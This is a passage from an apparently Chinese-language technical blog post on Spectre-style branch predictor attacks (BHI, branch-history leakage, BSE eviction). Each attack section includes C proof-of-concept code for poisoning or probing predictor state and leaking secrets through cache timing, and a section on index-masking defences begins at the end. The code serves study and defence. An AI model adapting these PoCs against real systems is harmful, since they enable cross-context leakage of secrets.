punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token comment">// 仅为示例，实际需针对平台和PC调整</span>    <span class="token function">poison_bhb_xor</span><span class="token punctuation">(</span>best_history<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 3. 清cache</span>    <span class="token function">flush_cache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 4. 受害者越界访问，实际应不进入if</span>    <span class="token function">victim_gadget</span><span class="token punctuation">(</span>SECRET <span class="token operator">+</span> <span class="token number">1000</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>victim_gadget<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 5. 侧信道恢复secret</span>    <span class="token keyword">int</span> leak <span class="token operator">=</span> <span class="token function">reload_cache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Leaked secret=%d (expect %d)\n"</span><span class="token punctuation">,</span> leak<span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="分支历史利用-Intel-ARM"><a href="#分支历史利用-Intel-ARM" class="headerlink" title="分支历史利用(Intel,ARM)"></a>分支历史利用(Intel,ARM)</h3><ul><li>原理（目标微结构）<ul><li>这里的重点是“读取&#x2F;推断”别的上下文或线程留下的分支历史状态（BHB&#x2F;BHT&#x2F;BPI 等），而不是仅仅注入。通过测量某些分支在预测器中的行为（如 misprediction 率或侧信道触发），可将分支方向&#x2F;分支目标等历史信息作为泄露通道。</li></ul></li><li>攻击思路要点<ul><li>利用预测器对历史敏感的性质，将其作为 oracle：对不同的历史位组合，训练-探测循环可以让攻击者判别目标上下文某些分支是否 taken，从而泄露分支相关秘密（例如条件分支是否走某路径代表一个 secret 位）。</li><li>攻击者并不一定要把预测器导向 gadget 并触发推测执行；相反，他们可以通过对预测器进行测试性冲突并观测 misprediction 发生与否来推断被测历史信息。</li></ul></li><li>所需条件 &#x2F; 限制<ul><li>能在与受害者共享预测器结构的上下文观察&#x2F;测量预测器输出（通常需要同核）。</li><li>需要一个精妙的 probe 流程，以便把预测行为的差异映射成可测到的现象（缓存访问、时间差、错误率等）。</li></ul></li></ul><p>Ps：与BHI还是有区别的，BHI是通过注入强制改变下一个条件分支的走向，而该攻击则是通过对预测历史的推测来获得隐藏信息</p><p>POC示例：victim被推测先前行为</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">victim_branch</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> secret_bit<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 这里的分支结果（taken or not-taken）将进入BHB/GHR最低位</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>secret_bit<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">""</span> <span class="token operator">::</span><span class="token operator">:</span> <span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// taken path</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">""</span> <span class="token operator">::</span><span class="token operator">:</span> <span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// not-taken path</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>attacker用于泄露victim的上一次分支结果</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// ---------- 攻击者：只做一次分支probe ----------</span><span class="token class-name">uint8_t</span> <span class="token function">attacker_probe_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 先清理cache，确保没有缓存干扰</span>    <span class="token function">_mm_clflush</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>probe<span class="token punctuation">[</span>PAGE_SIZE<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// probe分支，其预测受BHB最低位（即刚才victim的secret_bit）影响</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> aux<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span> t0 <span class="token operator">=</span> <span class="token function">__rdtscp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>aux<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 固定分支，分支预测行为依赖之前的BHB历史</span>        <span class="token keyword">volatile</span> <span class="token class-name">uint8_t</span> x <span class="token operator">=</span> probe<span class="token punctuation">[</span>PAGE_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">uint64_t</span> t1 <span class="token operator">=</span> <span class="token function">__rdtscp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>aux<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 高延迟：预测失误（mis-predicted）；低延迟：预测准确</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>t1 <span class="token operator">-</span> t0 <span class="token operator">&lt;</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 阈值“200”依平台可微调</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>主攻击流程，进行多次的攻击，防止偏差，通过预测成功的概率来判断secret为0&#x2F;1</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span> <span class="token comment">// 实验轮数</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> sb <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> sb <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span> sb<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> count_1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> count_0 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">victim_branch</span><span class="token punctuation">(</span>sb<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 受害者用secret_bit污染分支历史</span>            <span class="token class-name">uint8_t</span> guess <span class="token operator">=</span> <span class="token function">attacker_probe_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 攻击者probe预测</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>guess <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> count_1<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// probe命中低延迟</span>            <span class="token keyword">else</span> count_0<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token comment">// 选做：可在两步之间插入N条无关分支语句（避免干扰）</span>        <span class="token punctuation">&#125;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"For secret_bit=%d: judge=1 (fast) = %d, judge=0 (slow) = %d\n"</span><span class="token punctuation">,</span>            sb<span class="token punctuation">,</span> count_1<span class="token punctuation">,</span> count_0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="BSE-ARM"><a href="#BSE-ARM" class="headerlink" title="BSE(ARM)"></a>BSE(ARM)</h3><ul><li>原理（目标微结构）<ul><li>利用 BPU 的 “无偏分支预测” 特性，通过 BST（分支状态表）驱逐间接操纵 BHB（分支历史缓冲区），制造 BTB 索引碰撞，诱导目标分支恶意误预测的 Spectre 变体攻击。</li></ul></li><li>攻击思路要点<ul><li>通过地址别名（使不同虚拟地址映射到 predictor 的同一索引&#x2F;桶）或通过大量多样化的分支历史来耗尽 predictor 条目。</li><li>驱逐后，预测器可能使用次优的默认策略（例如回退到 BTB 或误判），这会增加受害者在某些分支处的 misprediction 概率或令预测器表现出可被攻击者利用的可预测行为。</li></ul></li><li>所需条件 &#x2F; 限制<ul><li>能在同核上执行大量分支以“刷”预测器。</li><li>成功依赖于预测器的容量与索引&#x2F;哈希方式；不同 CPU 需要不同规模的“填充”工作量。</li><li>可能需要与 BHI&#x2F;BPI 等方法结合以实现具体的目标（例如先驱逐再注入）。</li></ul></li></ul><p>Ps:该漏洞通常与注入攻击结合，先将BHB变得可控，后续再注入我们的指定序列，控制分支预测趋向</p><p>POC：原理很简单，就是调用大量无意义函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;x86intrin.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NUM_EVICTORS</span> <span class="token expression"><span class="token number">256</span>  </span><span class="token comment">// 你可以根据CPU实际BTB大小设为256~4096等大规模</span></span><span class="token comment">// 利用宏批量生成多个不同分支</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">DEFINE_EVICTOR</span><span class="token expression"><span class="token punctuation">(</span>i<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token keyword">void</span> evictor_</span><span class="token punctuation">##</span><span class="token expression"><span class="token function">i</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span></span><span class="token string">""</span> <span class="token expression"><span class="token operator">::</span><span class="token operator">:</span> </span><span class="token string">"memory"</span><span class="token expression"><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">EVICTOR_PTR</span><span class="token expression"><span class="token punctuation">(</span>i<span class="token punctuation">)</span> evictor_</span><span class="token punctuation">##</span><span class="token expression">i</span></span><span class="token comment">// 1. 声明全部分支</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GEN_EVICTORS</span><span class="token expression"><span class="token punctuation">(</span>N<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token function">GEN_EVICTORS_IMPL</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GEN_EVICTORS_IMPL</span><span class="token expression"><span class="token punctuation">(</span>N<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token function">GEN_EVICTORS1</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GEN_EVICTORS1</span><span class="token expression"><span class="token punctuation">(</span>N<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>  <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>  <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>  <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>  </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>  <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>  <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span> <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span> <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span> </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span> <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span> <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span> </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span> <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">)</span> <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span> </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span> <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span> <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span> <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">27</span><span class="token punctuation">)</span> </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">)</span> <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">29</span><span class="token punctuation">)</span> <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token function">EVICTOR_BODY</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">)</span> </span><span class="token punctuation">\</span>    <span class="token comment">/* ... 按照NUM_EVICTORS向上添加宏展开 ... */</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">EVICTOR_BODY</span><span class="token expression"><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token function">DEFINE_EVICTOR</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span></span></span><span class="token function">GEN_EVICTORS</span><span class="token punctuation">(</span>NUM_EVICTORS<span class="token punctuation">)</span><span class="token comment">// 2. 构造指针数组，循环调用</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>evictors<span class="token punctuation">[</span>NUM_EVICTORS<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">29</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">EVICTOR_PTR</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment">// ... 按照NUM_EVICTORS向上继续添加 ... </span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>noinline<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">void</span> <span class="token function">target_branch</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">""</span> <span class="token operator">::</span><span class="token operator">:</span> <span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token class-name">uint64_t</span> <span class="token function">measure_branch_predict</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>func<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> aux<span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span> t1 <span class="token operator">=</span> <span class="token function">__rdtscp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>aux<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span> t2 <span class="token operator">=</span> <span class="token function">__rdtscp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>aux<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> t2 <span class="token operator">-</span> t1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 1. 训练: 目标分支进入预测器</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token function">target_branch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span> t_hit <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> t_hit <span class="token operator">+=</span> <span class="token function">measure_branch_predict</span><span class="token punctuation">(</span>target_branch<span class="token punctuation">)</span><span class="token punctuation">;</span>    t_hit <span class="token operator">/=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[Before Evict] Target branch predict avg cycles: %lu\n"</span><span class="token punctuation">,</span> t_hit<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 2. 使用大量不同分支刷爆 BTB</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// 多轮确保evict更彻底</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_EVICTORS<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            evictors<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">uint64_t</span> t_miss <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> t_miss <span class="token operator">+=</span> <span class="token function">measure_branch_predict</span><span class="token punctuation">(</span>target_branch<span class="token punctuation">)</span><span class="token punctuation">;</span>    t_miss <span class="token operator">/=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[After Evict ] Target branch predict avg cycles: %lu\n"</span><span class="token punctuation">,</span> t_miss<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="现有防护方法"><a href="#现有防护方法" class="headerlink" title="现有防护方法"></a>现有防护方法</h2><h3 id="Index-Masking"><a href="#Index-Masking" class="headerlink" title="Index Masking"></a>Index Masking</h3><p>简单地对索引进行掩码操作，从软件层次上强制地将索引规定在合法区间中，示例如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//--- 原始，易受投机越界攻击的写法 ---</span><span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">&lt;</span> ARRAY_SIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    secret <span class="token operator">=</span> array<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//--- Index Masking 防护（最常见的掩码写法）---</span><span class="token comment">//要想得到真正的idx，必须强制等待mask值，从而保证等待idx&lt;ARRAY_SIZE的判断执行完毕</span><span class="token class-name">uint32_t</span> mask <span class="token operator">=</span> <span class="token punctuation">(</span>idx <span class="token operator">&lt;</span> ARRAY_SIZE<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">0xFFFFFFFF</span> <span class="token operator">:</span> <span class="token number">0x0</span><span class="token punctuation">;</span>    <span class="token comment">// 若越界则mask=0</span>idx <span class="token operator">=</span> idx <span class="token operator">&amp;</span> mask<span class="token punctuation">;</span>                    <span class="token comment">// 越界时idx强制为0</span>secret <span class="token operator">=</span> array<span class="token 